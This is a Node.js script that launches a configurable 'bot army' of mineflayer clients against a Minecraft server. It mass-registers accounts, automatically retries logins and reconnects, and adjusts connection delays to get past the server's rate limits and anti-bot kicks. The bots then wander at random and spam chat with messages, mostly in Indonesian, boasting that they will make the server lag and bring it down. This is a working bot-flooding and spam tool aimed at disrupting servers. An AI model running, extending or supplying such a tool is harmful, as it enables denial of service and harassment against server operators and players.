const mineflayer = require('mineflayer');
const fs = require('fs-extra');
const path = require('path');
const config = require('./config.json');

// Ensure directories exist
const botsDir = path.join(__dirname, 'bots');
const logsDir = path.join(__dirname, 'logs');
fs.ensureDirSync(botsDir);
fs.ensureDirSync(logsDir);

// Load credentials
const credPath = path.join(botsDir, 'credentials.json');
let credentials = fs.existsSync(credPath) ? fs.readJsonSync(credPath) : {};

// Track active bots
const activeBots = new Map();

// Global rate limiting
let currentDelay = 1500; // Start with 1.5s between connections
let lastConnectionTime = 0;
let rateLimitDetected = false;
const MAX_DELAY = 30000; // Maximum 30s delay

// ANSI color codes for console output
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  cyan: '\x1b[36m'
};

// Logger function with colors and file output
function log(botName, message, type = 'info') {
  try {
    const timestamp = new Date().toLocaleTimeString();
    const date = new Date().toISOString().split('T')[0];
    const logFile = path.join(logsDir, `${botName}-${date}.log`);
    const logMessage = `[${timestamp}] [${botName}] ${message}`;
    
    // Choose color based on message type
    let color = colors.reset;
    if (type === 'error') color = colors.red;
    else if (type === 'success') color = colors.green;
    else if (type === 'warning') color = colors.yellow;
    else if (type === 'system') color = colors.cyan;
    
    // Console output
    console.log(`${color}${logMessage}${colors.reset}`);
    
    // File output
    fs.appendFileSync(logFile, `${logMessage}\n`);
  } catch (err) {
    console.error(`Logging error: ${err.message}`);
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Rate-limited bot creation - waits for appropriate delay before creating a bot
async function createBotWithRateLimit(index) {
  // Calculate time since last connection
  const now = Date.now();
  const timeSinceLastConnection = now - lastConnectionTime;
  
  // If we need to wait more, do so
  if (timeSinceLastConnection < currentDelay) {
    const waitTime = currentDelay - timeSinceLastConnection;
    log('SYSTEM', `Rate limiting: waiting ${waitTime}ms before next connection`, 'warning');
    await delay(waitTime);
  }
  
  // Update last connection time and create bot
  lastConnectionTime = Date.now();
  return createBot(index);
}

// Creates and manages a bot
async function createBot(index) {
  const username = `${config.prefix}${index}`;
  let reconnectAttempts = 0;
  const maxReconnectAttempts = 10; // Increased from 5
  let reconnectDelay = 5000; // Start with 5 seconds
  let loginRetries = 0;
  const maxLoginRetries = 3;
  
  async function connect() {
    try {
      // Remove old bot if exists
      if (activeBots.has(username)) {
        const oldBot = activeBots.get(username);
        try {
          if (oldBot && oldBot.end) oldBot.end();
        } catch (e) {
          // Ignore errors while ending bot
        }
        activeBots.delete(username);
      }
      
      // Create new bot with proper error handling
      log(username, `Connecting to ${config.host}:${config.port}`, 'info');
      
      const bot = mineflayer.createBot({
        host: config.host,
        port: config.port,
        username,
        version: config.version,
        keepAlive: true,
        checkTimeoutInterval: 30000,
        viewDistance: 'tiny', // Reduce network load
        connectTimeout: 30000, // Increase connect timeout
        respawn: true, // Auto respawn if killed
        skipValidation: true, // Skip validation
      });
      
      activeBots.set(username, bot);
      
      // Set up all event handlers
      setupEventHandlers(bot, username);
      
      return bot;
    } catch (error) {
      log(username, `Failed to create bot: ${error.message}`, 'error');
      return null;
    }
  }
  
  function setupEventHandlers(bot, username) {
    // Set up error handlers first
    bot.on('error', (err) => {
      log(username, `Error: ${err.message}`, 'error');
      
      // Specifically handle ECONNRESET by marking as rate limited
      if (err.code === 'ECONNRESET') {
        rateLimitDetected = true;
        // Increase global delay when we see connection resets
        currentDelay = Math.min(currentDelay * 1.5, MAX_DELAY);
        log('SYSTEM', `ECONNRESET detected, increasing global delay to ${currentDelay}ms`, 'warning');
      }
    });
    
    // Spawn handler
    bot.once('spawn', async () => {
      log(username, 'Spawned', 'success');
      
      try {
        // Wait a bit before trying to authenticate
        await delay(1000 + Math.random() * 500);
        
        // Handle authentication
        if (!credentials[username]) {
          await performRegistration(bot, username);
        } else {
          await performLogin(bot, username);
        }
        
        // Start bot activities after successful spawn
        startBotActivities(bot, username);
        
        // Reset reconnection attempts on successful spawn
        reconnectAttempts = 0;
        reconnectDelay = 5000;
        loginRetries = 0;
      } catch (error) {
        log(username, `Error during spawn: ${error.message}`, 'error');
      }
    });
    
    // Message handler for login detection
    bot.on('message', (message) => {
      const msg = message.toString().toLowerCase();
      
      // Log all messages
      log(username, `Chat: ${message.toString()}`, 'info');
      
      // Check for rate limiting messages
      if (msg.includes("logging in too fast") || msg.includes("try again later")) {
        rateLimitDetected = true;
        // Increase global delay when rate limited
        currentDelay = Math.min(currentDelay * 2, MAX_DELAY);
        log('SYSTEM', `Rate limit detected, increasing global delay to ${currentDelay}ms`, 'warning');
      }
      
      // Handle login success/failure messages
      if (msg.includes('success') && msg.includes('log')) {
        log(username, 'Login successful', 'success');
        loginRetries = 0;
      } else if ((msg.includes('wrong password') || msg.includes('failed')) && msg.includes('log')) {
        log(username, 'Login failed', 'error');
        loginRetries++;
        
        // Try to login again after delay if we haven't exceeded retry limit
        if (loginRetries < maxLoginRetries) {
          setTimeout(() => {
            if (bot.entity) {
              bot.chat(`/login ${credentials[username]}`);
              log(username, `Retrying login... (${loginRetries + 1}/${maxLoginRetries})`, 'warning');
            }
          }, 3000);
        } else {
          log(username, `Max login retries (${maxLoginRetries}) reached`, 'error');
        }
      }
    });
    
    // Registration handler
    async function performRegistration(bot, username) {
      log(username, 'Attempting registration', 'info');
      bot.chat(`/register ${config.password} ${config.password}`);
      credentials[username] = config.password;
      
      try {
        fs.writeJsonSync(credPath, credentials, { spaces: 2 });
        log(username, 'Registered and credentials saved', 'success');
      } catch (err) {
        log(username, `Failed to save credentials: ${err.message}`, 'error');
      }
    }
    
    // Login handler with retries
    async function performLogin(bot, username) {
      log(username, 'Attempting login', 'info');
      bot.chat(`/login ${credentials[username]}`);
    }
    
    // Disconnection handler
    bot.on('end', async () => {
      log(username, 'Disconnected', 'warning');
      activeBots.delete(username);
      
      // If we're rate limited, add extra delay
      if (rateLimitDetected) {
        const extraDelay = Math.random() * 10000 + 5000; // 5-15s additional delay
        log(username, `Rate limit detected, adding ${Math.round(extraDelay/1000)}s extra delay`, 'warning');
        await delay(extraDelay);
        rateLimitDetected = false;
      }
      
      // Attempt to reconnect with exponential backoff
      if (reconnectAttempts < maxReconnectAttempts) {
        reconnectAttempts++;
        // Add jitter to the reconnect delay to prevent all bots reconnecting at once
        const jitter = Math.random() * 2000 - 1000; // ±1s jitter
        const actualDelay = reconnectDelay + jitter;
        
        log(username, `Reconnecting in ${Math.round(actualDelay/1000)}s (Attempt ${reconnectAttempts}/${maxReconnectAttempts})`, 'warning');
        
        setTimeout(async () => {
          // Use rate-limited connect to prevent server overload
          await createBotWithRateLimit(index);
          // Increase delay for next attempt with a slower growth rate
          reconnectDelay = Math.min(reconnectDelay * 1.3, 30000);
        }, actualDelay);
      } else {
        log(username, 'Max reconnection attempts reached', 'error');
      }
    });
    
    // Kick handler with specific handling for rate limiting
    bot.on('kicked', (reason, loggedIn) => {
      try {
        const parsedReason = typeof reason === 'string' ? JSON.parse(reason) : reason;
        const reasonStr = typeof parsedReason === 'object' ? JSON.stringify(parsedReason) : parsedReason;
        log(username, `Kicked: ${reasonStr}`, 'error');
        
        // Check for rate limiting kick messages
        if (typeof reasonStr === 'string' && 
            (reasonStr.includes("too fast") || reasonStr.includes("try again") || 
             reasonStr.includes("rate") || reasonStr.includes("limit"))) {
          rateLimitDetected = true;
          // Double the connection delay when explicitly rate limited
          currentDelay = Math.min(currentDelay * 2, MAX_DELAY);
          log('SYSTEM', `Rate limit kick detected, doubling global delay to ${currentDelay}ms`, 'warning');
        }
      } catch (e) {
        log(username, `Kicked: ${reason}`, 'error');
      }
    });
    
    // Health updates
    bot.on('health', () => {
      if (bot.health < 5) {
        log(username, `Low health: ${bot.health}`, 'warning');
      }
    });
    
    // Player tracking
    bot.on('playerJoined', (player) => {
      log(username, `Player joined: ${player.username}`);
    });
    
    bot.on('playerLeft', (player) => {
      log(username, `Player left: ${player.username}`);
    });
    
    // Movement error handler (to prevent crashes)
    bot.on('moveEntityError', (entity) => {
      log(username, `Move entity error with ${entity.name || entity.username || 'entity'}`, 'error');
    });
  }
  
  // Start the bot behaviors - using more conservative timings
  function startBotActivities(bot, username) {
    // Custom messages for spam
    const messages = [
      `${username} siap menghancurkan server! 🔥`,
      `Server ini akan down oleh ${username}! 💣`,
      `${username} tidak terkalahkan! ⚔️`,
      `Bot army telah datang! 🤖`,
      `Resistance is futile! ${username} is here! 🛡️`,
      `${username} akan membuat server lag! 📉`,
      `Jangan coba melawan ${username}! 👑`,
      `${username} telah bangkit! 🧟`
    ];
    
    // More complex movements
    const moveIntervals = [];
    
    // Jump around (less frequently)
    moveIntervals.push(setInterval(() => {
      if (bot.entity) {
        bot.setControlState('jump', true);
        setTimeout(() => bot.setControlState('jump', false), 350);
      }
    }, 8000 + Math.random() * 5000));
    
    // Random movement (less frequently)
    moveIntervals.push(setInterval(() => {
      if (bot.entity) {
        const movements = ['forward', 'back', 'left', 'right'];
        const movement = movements[Math.floor(Math.random() * movements.length)];
        
        bot.setControlState(movement, true);
        setTimeout(() => {
          bot.setControlState(movement, false);
        }, 500 + Math.random() * 1000);
        
        // Random look
        bot.look(Math.random() * Math.PI * 2, Math.random() * Math.PI - Math.PI/2);
      }
    }, 5000 + Math.random() * 5000));
    
    // Chat spam with random messages (much less frequently)
    moveIntervals.push(setInterval(() => {
      if (bot.entity) {
        const message = messages[Math.floor(Math.random() * messages.length)];
        bot.chat(message);
      }
    }, 15000 + Math.random() * 10000));
    
    // Clean up intervals on disconnect
    bot.once('end', () => {
      moveIntervals.forEach(interval => clearInterval(interval));
    });
  }
  
  // Start the bot
  return await connect();
}

// Start system with rate limiting
(async () => {
  try {
    // Show startup message
    log('SYSTEM', `Starting bot army for ${config.host}:${config.port}`, 'system');
    log('SYSTEM', `Targeting Minecraft ${config.version} with ${config.totalBots} bots`, 'system');
    log('SYSTEM', `Initial connection delay: ${currentDelay}ms`, 'system');
    
    // Launch bots with rate limiting
    for (let i = config.startIndex; i < config.startIndex + config.totalBots; i++) {
      await createBotWithRateLimit(i);
      // Add dynamic delay based on observations
      if (rateLimitDetected) {
        log('SYSTEM', 'Rate limit detected, increasing connection delay', 'warning');
        rateLimitDetected = false;
      }
    }
    
    // Log status periodically
    setInterval(() => {
      const uptime = process.uptime();
      const minutes = Math.floor(uptime / 60);
      const seconds = Math.floor(uptime % 60);
      log('SYSTEM', `Status: ${activeBots.size}/${config.totalBots} bots active, uptime: ${minutes}m ${seconds}s, current delay: ${currentDelay}ms`, 'system');
    }, 60000);
  } catch (err) {
    log('SYSTEM', `CRITICAL ERROR: ${err.message}`, 'error');
    console.error(err);
  }
})();
